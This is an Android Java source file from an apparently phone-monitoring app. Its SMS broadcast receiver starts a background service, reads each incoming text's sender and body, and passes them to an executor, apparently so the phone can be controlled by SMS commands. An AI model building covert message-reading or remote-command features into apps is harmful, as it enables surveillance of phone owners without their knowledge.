package com.monitor.phone.s0ft.phonemonitor;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;


public class SMSBroadcastReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Intent startMainServiceIntent = new Intent(context, MainService.class);
        context.startService(startMainServiceIntent);

        String action = intent.getAction();
        if (action != null && action.equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pduObjs = (Object[]) bundle.get("pdus");
                if (pduObjs != null) {
                    for (Object pduObj : pduObjs) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pduObj);
                        String sendernumber = smsMessage.getOriginatingAddress();
                        if (sendernumber != null) {
                            Log.w(AppSettings.getTAG(), "SMS broadcast received!");
                            String messagebody = smsMessage.getMessageBody();
                            SMSExecutor smsExecutor = new SMSExecutor(sendernumber, messagebody, context);
                            smsExecutor.Execute();
                        }
                    }
                }
            }
        }
    }
}
